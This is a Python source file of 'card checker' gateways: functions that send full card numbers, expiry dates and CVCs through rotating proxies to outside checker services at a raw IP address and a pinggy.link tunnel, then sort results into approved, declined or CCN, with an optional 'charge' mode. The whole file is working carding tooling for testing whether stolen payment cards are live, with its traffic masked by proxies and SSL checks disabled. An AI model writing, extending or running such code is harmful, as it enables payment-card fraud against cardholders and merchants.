"""
Direct API Gateways from gatesandapi.txt
Multiple working API endpoints for card checking
"""

import requests
import time
import urllib3
from gates.utilities import http_request, REQUEST_TIMEOUT

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def braintree_auth_api_check(card_num, card_mon, card_yer, card_cvc, proxy=None):
    """
    Braintree Auth check using direct API
    API: http://135.148.14.197:9292/iditarod
    
    Returns:
        tuple: (status, proxy_live)
    """
    
    proxy_live = "No"
    
    try:
        # Normalize year
        if len(card_yer) == 2:
            card_yer = "20" + card_yer
        
        # Build API URL
        api_url = f"http://135.148.14.197:9292/iditarod?cc={card_num}%7C{card_mon}%7C{card_yer}%7C{card_cvc}"
        
        # Setup proxy
        proxies = None
        if proxy:
            try:
                parts = proxy.split(':')
                if len(parts) == 4:
                    proxies = {
                        'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                        'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                    }
                else:
                    proxies = {
                        'http': f'http://{parts[0]}:{parts[1]}',
                        'https': f'http://{parts[0]}:{parts[1]}'
                    }
            except (ValueError, IndexError) as e:
                pass
        
        response = requests.get(api_url, proxies=proxies, timeout=20, verify=False)
        result = response.text
        
        # Parse result
        if "approved" in result.lower() or "success" in result.lower():
            proxy_live = "Yes"
            return (f"Approved ✅", proxy_live)
        elif "declined" in result.lower():
            return ("Declined", proxy_live)
        elif "ccn" in result.lower() or "cvc" in result.lower():
            return ("CCN", proxy_live)
        else:
            return (result[:100], proxy_live)
    
    except Exception as e:
        return (f"Error: {str(e)[:50]}", proxy_live)


def cvv_pinggy_check(card_num, card_mon, card_yer, card_cvc, mode="auth", proxy=None):
    """
    CVV checker using pinggy.link API
    API: https://cvv.a.pinggy.link
    
    Args:
        mode: "auth" or "charge"
    
    Returns:
        tuple: (status, proxy_live)
    """
    
    proxy_live = "No"
    
    try:
        BASE = "https://cvv.a.pinggy.link"
        COOKIE = {"validated_bot": "1"}
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json"
        }
        
        # Setup proxy
        proxies = None
        if proxy:
            try:
                parts = proxy.split(':')
                if len(parts) == 4:
                    proxies = {
                        'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                        'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                    }
                else:
                    proxies = {
                        'http': f'http://{parts[0]}:{parts[1]}',
                        'https': f'http://{parts[0]}:{parts[1]}'
                    }
            except (ValueError, IndexError) as e:
                pass
        
        # Normalize year
        if len(card_yer) == 2:
            card_yer = "20" + card_yer
        
        # Determine endpoint
        if mode.lower() == "charge":
            ENDPOINT = "/api/start_checking_charged"
        else:
            ENDPOINT = "/api/start_checking"
        
        # Parse card
        card_input = f"{card_num}|{card_mon}|{card_yer}|{card_cvc}"
        
        parse_response = requests.post(
            f"{BASE}/api/parse_cards",
            json={"input_text": card_input},
            headers=headers,
            cookies=COOKIE,
            proxies=proxies,
            timeout=15,
            verify=False
        )

        if parse_response.status_code != 200:
            return ("Error: parse failed", proxy_live)

        try:
            parsed_json = parse_response.json()
            parsed_card = parsed_json["cards"][0]
        except Exception as exc:
            return (f"Error: parse json ({str(exc)[:40]})", proxy_live)

        start_response = requests.post(
            f"{BASE}{ENDPOINT}",
            json={"cards": [parsed_card]},
            headers=headers,
            cookies=COOKIE,
            proxies=proxies,
            timeout=15,
            verify=False
        )

        if start_response.status_code != 200:
            return ("Error: start failed", proxy_live)

        try:
            session_id = start_response.json().get("session_id")
        except Exception as exc:
            return (f"Error: start json ({str(exc)[:40]})", proxy_live)

        if not session_id:
            return ("Error: session id missing", proxy_live)

        max_attempts = 30
        for _ in range(max_attempts):
            progress_response = requests.get(
                f"{BASE}/api/get_progress/{session_id}",
                headers=headers,
                cookies=COOKIE,
                proxies=proxies,
                timeout=15,
                verify=False
            )

            if progress_response.status_code != 200:
                time.sleep(0.5)
                continue

            try:
                progress_json = progress_response.json()
            except Exception:
                time.sleep(0.5)
                continue

            results = progress_json.get("results") or []
            counters = progress_json.get("counters", {})
            if results and counters.get("total_checked") == progress_json.get("total"):
                result = results[0]
                status_text = result.get("status", "")
                gateway = result.get("gateway", "")
                message = result.get("message", "")
                response_code = result.get("response_code", "")

                base_message = message
                if response_code:
                    base_message = f"{message} [{response_code}]".strip()

                status_lower = status_text.lower()
                if "approved" in status_lower or "live" in status_lower or "charge" in status_lower:
                    proxy_live = "Yes"
                    return (f"Approved ✅ [{gateway}] {base_message}".strip(), proxy_live)
                if "declined" in status_lower:
                    return (f"Declined [{gateway}] {base_message}".strip(), proxy_live)
                if "ccn" in status_lower:
                    return (f"CCN [{gateway}] {base_message}".strip(), proxy_live)
                return (f"{status_text} [{gateway}] {base_message}".strip()[:100], proxy_live)

            time.sleep(0.5)

        return ("Error: Timeout waiting for result", proxy_live)
    
    except Exception as e:
        return (f"Error: {str(e)[:50]}", proxy_live)


# Convenience functions
def cvv_pinggy_auth_check(card_num, card_mon, card_yer, card_cvc, proxy=None):
    """Auth mode wrapper"""
    return cvv_pinggy_check(card_num, card_mon, card_yer, card_cvc, "auth", proxy)


def cvv_pinggy_charge_check(card_num, card_mon, card_yer, card_cvc, proxy=None):
    """Charge mode wrapper"""
    return cvv_pinggy_check(card_num, card_mon, card_yer, card_cvc, "charge", proxy)


if __name__ == "__main__":
    # Test the gateways
    print("Testing API Gateways")
    print("="*50)
    
    test_card = "4242424242424242|12|25|123"
    parts = test_card.split("|")
    
    print("\n1. Braintree Auth API:")
    status, proxy = braintree_auth_api_check(parts[0], parts[1], parts[2], parts[3])
    print(f"   Status: {status}")
    
    print("\n2. CVV Pinggy (Auth):")
    status, proxy = cvv_pinggy_auth_check(parts[0], parts[1], parts[2], parts[3])
    print(f"   Status: {status}")
